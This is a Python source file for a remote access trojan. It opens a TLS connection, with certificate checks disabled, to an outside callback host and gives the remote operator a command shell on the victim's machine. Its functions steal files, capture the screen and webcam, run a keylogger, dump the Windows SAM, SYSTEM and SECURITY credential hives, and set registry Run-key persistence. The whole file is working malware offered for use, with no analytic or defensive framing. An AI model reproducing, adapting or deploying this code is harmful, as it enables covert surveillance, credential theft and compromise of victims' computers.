# Standard library imports
import ctypes
import cv2
import json
import os
import shutil
import socket
import ssl
import subprocess
import sys
import threading
import time
from sys import platform

# Related third party imports
import requests
from mss import mss

# Local application/library specific imports
import keylogger


def reliable_send(s, data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())


def reliable_recv(s):
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def download_file(s, file_name):
    f = open(file_name, 'wb')
    s.settimeout(2)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()


def upload_file(s, file_name):
    f = open(file_name, 'rb')
    s.send(f.read())
    f.close()


def download_url(url):
    get_response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, 'wb') as out_file:
        out_file.write(get_response.content)


def screenshot():
    if platform == "win32" or platform == "darwin":
        with mss() as screen:
            filename = screen.shot()
            os.rename(filename, '.screen.png')
    elif platform == "linux" or platform == "linux2":
        with mss(display=":0.0") as screen:
            filename = screen.shot()
            os.rename(filename, '.screen.png')


def get_sam_dump():
    if not is_admin():
        return "You must run this function as an Administrator."

    SAM = r'C:\Windows\System32\config\SAM'
    SYSTEM = r'C:\Windows\System32\config\SYSTEM'
    SECURITY = r'C:\Windows\System32\config\SECURITY'

    try:
        sam_file = open(SAM, 'rb')
        system_file = open(SYSTEM, 'rb')
        security_file = open(SECURITY, 'rb')

        sam_data = sam_file.read()
        system_data = system_file.read()
        security_data = security_file.read()

        sam_file.close()
        system_file.close()
        security_file.close()

        return sam_data, system_data, security_data
    except PermissionError:
        return "Insufficient permissions to access SAM, SYSTEM, or SECURITY files."
    except FileNotFoundError:
        return "SAM, SYSTEM, or SECURITY file not found. Please check the file paths."
    except Exception as e:
        return f"An unexpected error occurred: {str(e)}"


def capture_webcam():
    webcam = cv2.VideoCapture(0)
    webcam.set(cv2.CAP_PROP_EXPOSURE, 40)

    if not webcam.isOpened():
        print("No webcam available")
        return

    ret, frame = webcam.read()

    if not ret:
        print("Failed to read frame from webcam")
        return

    webcam.release()

    is_success, im_buf_arr = cv2.imencode(".webcam.png", frame)
    if is_success:
        with open('.webcam.png', 'wb') as f:
            f.write(im_buf_arr.tobytes())
    else:
        print("Failed to save webcam image")


def persist(s, reg_name, copy_name):
    file_location = os.environ['appdata'] + '\\' + copy_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call(
                r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + r' /t REG_SZ /d "' + file_location + r'"',
                shell=True)
            reliable_send(s, '[+] Created Persistence With Reg Key: ' + reg_name)
        else:
            reliable_send(s, '[+] Persistence Already Exists')
    except:
        reliable_send(s, '[-] Error Creating Persistence With The Target Machine')


def is_admin():
    global admin
    if platform == 'win32':
        try:
            temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', r'C:\windows'), 'temp']))
        except:
            admin = '[!!] User Privileges!'
        else:
            admin = '[+] Administrator Privileges!'


def shell(s):
    while True:
        command = reliable_recv(s)
        if command == 'quit':
            break
        elif command == 'background' or command == 'bg':
            pass
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:6] == 'upload':
            download_file(s, command[7:])
        elif command[:8] == 'download':
            upload_file(s, command[9:])
        elif command[:3] == 'get':
            try:
                download_url(command[4:])
                reliable_send(s, '[+] Downloaded File From Specified URL!')
            except:
                reliable_send(s, '[!!] Download Failed!')
        elif command[:10] == 'screenshot':
            screenshot()
            upload_file(s, '.screen.png')
            os.remove('.screen.png')
        elif command[:6] == 'webcam':
            capture_webcam()
            upload_file(s, '.webcam.png')
            os.remove('.webcam.png')
        elif command[:12] == 'keylog_start':
            keylog = keylogger.Keylogger()
            t = threading.Thread(target=keylog.start)
            t.start()
            reliable_send(s, '[+] Keylogger Started!')
        elif command[:11] == 'keylog_dump':
            logs = keylog.read_logs()
            reliable_send(s, logs)
        elif command[:11] == 'keylog_stop':
            keylog.self_destruct()
            t.join()
            reliable_send(s, '[+] Keylogger Stopped!')
        elif command[:11] == 'persistence':
            reg_name, copy_name = command[12:].split(' ')
            persist(s, reg_name, copy_name)
        elif command[:7] == 'sendall':
            subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                             stdin=subprocess.PIPE)
        elif command[:5] == 'check':
            try:
                is_admin()
                reliable_send(s, admin + ' platform: ' + platform)
            except:
                reliable_send(s, 'Cannot Perform Privilege Check! Platform: ' + platform)
        elif command[:5] == 'start':
            try:
                subprocess.Popen(command[6:], shell=True)
                reliable_send(s, '[+] Started!')
            except:
                reliable_send(s, '[-] Failed to start!')
        elif command[:12] == 'get_sam_dump':
            sam_dump, system_dump, security_dump = get_sam_dump()
            reliable_send(s, (sam_dump, system_dump, security_dump))
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(s, result)

def handshake(s):
    """
    Sends an initial handshake message to the server.
    Useful for session registration and connection validation.
    """
    try:
        reliable_send(s, {"status": "connected", "platform": platform})
    except Exception as e:
        print(f"[!] Handshake failed: {e}")


def connection():
    host = 'callback.scarletpug.com'
    port = 443

    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    while True:
        try:
            raw_socket = socket.create_connection((host, port))
            s = context.wrap_socket(raw_socket, server_hostname=host)

            print("[+] Connected to server over TLS")

            handshake(s)  # <-- send handshake before entering shell
            shell(s)

            s.close()
            break
        except Exception as e:
            print(f"[!] Connection error: {e}")
            try:
                s.close()
            except:
                pass
            time.sleep(5)


connection()
